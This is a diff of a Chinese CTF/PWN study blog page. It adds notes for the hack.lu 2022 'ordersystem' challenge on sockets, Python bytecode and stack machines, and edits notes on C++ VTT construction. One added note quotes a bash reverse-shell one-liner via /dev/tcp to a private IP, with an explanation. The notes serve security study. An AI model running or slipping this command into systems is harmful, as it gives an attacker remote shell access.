@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="article:published_time" content="2022-09-08T02:00:00.000Z">
-<meta property="article:modified_time" content="2022-11-14T16:17:21.039Z">
+<meta property="article:modified_time" content="2022-11-16T02:59:22.503Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
@@ -215,7 +215,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      71k 字
+      72k 字
     </span>
   
 
@@ -224,7 +224,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      889 分钟
+      896 分钟
     </span>
   
 
@@ -265,7 +265,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年11月15日 凌晨
+                  不可视境界线最后变动于：2022年11月16日 上午
                 
               </p>
             
@@ -639,11 +639,32 @@
 <h2 id="看不见的彼方"><a href="#看不见的彼方" class="headerlink" title="看不见的彼方"></a>看不见的彼方</h2><p>额, 先看rust去了. </p>
 <h1 id="hack-lu-2022"><a href="#hack-lu-2022" class="headerlink" title="hack.lu 2022"></a>hack.lu 2022</h1><h2 id="ordersystem"><a href="#ordersystem" class="headerlink" title="ordersystem"></a>ordersystem</h2><p>一眼看到python中<code>socket.socket()</code> 先查一下以前没注意的东西.</p>
 <ul>
-<li><code>setsockopt</code>使用场景: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/77023584">link</a> </li>
-<li>reuseaddr/reuseport: <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9cc2b5b9ad4d">查询过程源码</a> <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000020524323">reuseport版本演进</a> </li>
-<li>bind到 0.0.0.0, 127.0.0.1 localhost 有何<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/20778771">区别</a> </li>
-<li>在docker环境上遇到一点小问题, 重新build了一下. woc为什么链接没反应?? 好吧重启解决问题了. <code>service docker restart</code> </li>
+<li><p><code>setsockopt</code>使用场景: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/77023584">link</a> </p>
+</li>
+<li><p>reuseaddr/reuseport: <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9cc2b5b9ad4d">查询过程源码</a> <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000020524323">reuseport版本演进</a> </p>
+</li>
+<li><p>bind到 0.0.0.0, 127.0.0.1 localhost 有何<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/20778771">区别</a> </p>
+</li>
+<li><p>在docker环境上遇到一点小问题, 重新build了一下. woc为什么链接没反应?? 好吧重启解决问题了. <code>service docker restart</code> </p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pandana/p/16289320.html">反弹shell</a> </p>
+<ul>
+<li><p><code>bash -i &gt;&amp; /dev/tcp/192.168.1.102/7777 0&gt;&amp;1</code>　　（实际的命令解析为：将目标主机的bash shell以-i交互式的方式，标准输出+错误输出重定向到192.168.1.102:7777，而在192.168.1.102:7777的标准输入命令会重定向到192.168.1.102:7777的标准输出中）</p>
+<p><strong>简言而知，就是将目标主机的标准输入、标准输出、错误输出全都重定向到攻击端上</strong> </p>
+</li>
+</ul>
+</li>
+<li><p>python的bytecode真没了解过, 要暴毙了. 这能上哪儿搜. 跟cpython有挺大关系. 又查到了python vm. 又是python的fundamental, 我要疯了怎么又来这么多的东西. 一看就是一星期的量ahhhhhhhhhhhhhhhhhhhhh</p>
+</li>
+</ul>
+<p>bytecode relevant:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/3299648/python-compilation-interpretation-process">bytecode instance</a> | <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19916729/how-exactly-is-python-bytecode-run-in-cpython">theory</a>. 一篇巨长的<a target="_blank" rel="noopener" href="https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d">文章</a>, 连指令都全部列出来. </li>
+<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a> vs. register machine<ul>
+<li>Stack machines extend <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Push-down_automata">push-down automata</a> with additional load/store operations or multiple stacks and hence are <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Turing-complete">Turing-complete</a>.</li>
 <li></li>
+</ul>
+</li>
 </ul>
 <h2 id="RIOT"><a href="#RIOT" class="headerlink" title="RIOT"></a>RIOT</h2><p>RIOT src <a target="_blank" rel="noopener" href="https://github.com/RIOT-OS/RIOT/blob/a21f05aeffd9fdf0e61026d85b465c652a9cf8c9/drivers/ethos/ethos.c#L379">off-by-one</a> </p>
 <ul>
@@ -889,7 +910,7 @@
 <p>为什么会有VTT? 来看看child的初始化就明白了:</p>
 <ul>
 <li>首先Grandparent construction, 初始化vtable指针指向primary vtable.</li>
-<li>然后Parent1初始化Child内存中的vtable ptr为VTT中Parent1-in-Child值(也就是vtable for Parent1),<br><strong>再修改GrandParent vtable指针指向其vtable中的Grandparent部分</strong>. 关键在于Parent1如何知道其子类Child内存中Grandparent和他自身的距离? 方法就是传入了VTT地址, 两个Parent1-in-Child指针指示了对应的construction table和table中的vbase offset. <ul>
+<li>然后Parent1初始化Child内存中的vtable ptr为VTT中Parent1-in-Child值(也就是vtable for Parent1),<br><strong>再修改GrandParent vtable指针指向其vtable中的Grandparent部分</strong>. 关键在于Parent1如何知道其子类Child内存中Grandparent和他自身的距离? 方法就是传入了VTT地址, 两个Parent1-in-Child指针指示了对应的construction table和该table中的vbase offset. <ul>
 <li>其实这种情况下只传一个指针也是足够的, 但是当parent也有多个基类时就不得不使用VTT了, 很明显需要访问其多个基类的secondary vtable中的vbase offset来确定多个基类的vtable指针值(都在Child内存中). </li>
 </ul>
 </li>
